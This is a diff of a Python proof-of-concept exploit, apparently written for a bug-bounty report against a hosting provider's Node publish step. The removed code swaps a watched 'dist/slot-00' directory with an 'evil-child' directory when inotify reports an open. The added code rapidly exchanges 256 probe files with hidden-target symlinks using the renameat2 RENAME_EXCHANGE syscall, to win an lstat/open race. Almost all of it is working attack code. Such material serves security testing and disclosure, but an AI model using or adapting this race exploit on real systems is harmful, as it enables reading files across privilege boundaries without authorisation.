@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Swap a watched child directory as the publisher opens it."""
+"""Race regular files against hidden-target symlinks during publish."""
 
 from __future__ import annotations
 
@@ -7,24 +7,24 @@ import ctypes
 import json
 import os
 from pathlib import Path
-import struct
 import time
 
 
 SYS_RENAMEAT2 = 316
 AT_FDCWD = -100
 RENAME_EXCHANGE = 2
-IN_ACCESS = 0x00000001
-IN_OPEN = 0x00000020
-MARKER = b"HOSTINGER_NODE_INOTIFY_CHILDFILE_TOCTOU_GATE:r228"
+MARKER = b"HOSTINGER_NODE_FILE_LSTAT_OPEN_TOCTOU_GATE:r229"
 PUBLISHING = b"==> Publishing"
+FILE_COUNT = 256
 libc = ctypes.CDLL(None, use_errno=True)
-first = os.fsencode("dist/slot-00")
-second = os.fsencode("evil-child")
 started = time.monotonic()
 deadline = started + 30.0
 logs_root = Path.cwd().parents[1] / "logs"
-trace = {"marker": MARKER.decode(), "event": "not-observed", "logsRootAccessible": logs_root.is_dir()}
+pairs = [
+    (os.fsencode(f"dist/probe-{index:03d}"), os.fsencode(f"race-alternates/alt-{index:03d}"))
+    for index in range(FILE_COUNT)
+]
+trace = {"marker": MARKER.decode(), "event": "not-observed", "fileCount": FILE_COUNT, "logsRootAccessible": logs_root.is_dir()}
 
 
 def current_log() -> Path | None:
@@ -41,7 +41,7 @@ def current_log() -> Path | None:
     return None
 
 
-def exchange() -> int:
+def exchange(first: bytes, second: bytes) -> int:
     return libc.syscall(
         SYS_RENAMEAT2,
         AT_FDCWD,
@@ -52,19 +52,13 @@ def exchange() -> int:
     )
 
 
-inotify_fd = libc.inotify_init1(os.O_NONBLOCK | os.O_CLOEXEC)
-watch = -1
-if inotify_fd >= 0:
-    watch = libc.inotify_add_watch(inotify_fd, ctypes.c_char_p(first), IN_OPEN | IN_ACCESS)
-trace.update(inotifyFdOk=inotify_fd >= 0, watchOk=watch >= 0)
-
 log_path = None
 while time.monotonic() < deadline and log_path is None:
     log_path = current_log()
     if log_path is None:
         time.sleep(0.0005)
 
-if log_path is not None and watch >= 0:
+if log_path is not None:
     trace.update(event="current-log-found", logFoundAfterMs=round((time.monotonic() - started) * 1000, 3))
     while time.monotonic() < deadline:
         try:
@@ -76,59 +70,38 @@ if log_path is not None and watch >= 0:
             time.sleep(0.00025)
             continue
         trace.update(event="publishing-observed", publishingAfterMs=round((time.monotonic() - started) * 1000, 3))
-        event_deadline = time.monotonic() + 2.0
-        while time.monotonic() < event_deadline:
-            try:
-                event = os.read(inotify_fd, 4096)
-            except BlockingIOError:
-                time.sleep(0.00005)
-                continue
-            except OSError:
-                event = b""
-            if not event:
-                time.sleep(0.00005)
-                continue
-            child_name = None
-            child_mask = 0
-            offset = 0
-            while offset + 16 <= len(event):
-                _, mask, _, name_length = struct.unpack_from("iIII", event, offset)
-                name_start = offset + 16
-                name_end = name_start + name_length
-                name = event[name_start:name_end].split(b"\0", 1)[0]
-                if mask & IN_OPEN and name:
-                    child_name = name.decode(errors="replace")
-                    child_mask = mask
-                    break
-                offset = name_end
-            if child_name is None:
-                continue
-            trace.update(
-                event="child-file-open-observed",
-                childFileOpenAfterMs=round((time.monotonic() - started) * 1000, 3),
-                childName=child_name,
-                childMask=child_mask,
-                eventBytes=len(event),
-            )
-            result = exchange()
-            trace["exchangeErrno"] = ctypes.get_errno() if result != 0 else 0
-            if result == 0:
-                time.sleep(0.5)
-                restore = exchange()
-                trace["restoreErrno"] = ctypes.get_errno() if restore != 0 else 0
-            break
+        race_deadline = time.monotonic() + 1.5
+        loops = 0
+        exchanges = 0
+        errors = 0
+        while time.monotonic() < race_deadline:
+            for first, second in pairs:
+                if exchange(first, second) == 0:
+                    exchanges += 1
+                else:
+                    errors += 1
+            for first, second in reversed(pairs):
+                if exchange(first, second) == 0:
+                    exchanges += 1
+                else:
+                    errors += 1
+            loops += 1
+        trace.update(loops=loops, exchanges=exchanges, exchangeErrors=errors)
         break
 
-try:
-    if Path("dist/slot-00").is_symlink() and Path("evil-child").is_dir():
-        exchange()
-except OSError:
-    pass
-if inotify_fd >= 0:
-    os.close(inotify_fd)
+restored = 0
+for index, (first, second) in enumerate(pairs):
+    probe = Path(f"dist/probe-{index:03d}")
+    alternate = Path(f"race-alternates/alt-{index:03d}")
+    try:
+        if probe.is_symlink() and alternate.is_file() and exchange(first, second) == 0:
+            restored += 1
+    except OSError:
+        continue
+trace["restoredFiles"] = restored
 trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
 try:
-    trace_path = Path.home() / ".h1-r228-race-trace.json"
+    trace_path = Path.home() / ".h1-r229-race-trace.json"
     trace_path.write_text(json.dumps(trace, sort_keys=True))
     trace_path.chmod(0o600)
 except OSError:
